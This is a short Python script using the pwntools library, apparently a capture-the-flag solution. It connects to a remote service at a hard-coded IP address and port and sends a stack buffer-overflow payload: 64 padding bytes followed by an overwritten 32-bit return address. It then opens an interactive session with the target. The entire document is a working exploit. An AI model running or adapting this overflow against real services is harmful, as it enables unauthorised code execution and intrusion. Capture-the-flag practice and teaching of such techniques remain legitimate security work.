from pwn import *

submit = remote("139.144.184.150", 3333)

payload = "A"* 64 + "\x5e\x87\x04\x08"

submit.sendline(payload)
submit.interactive()
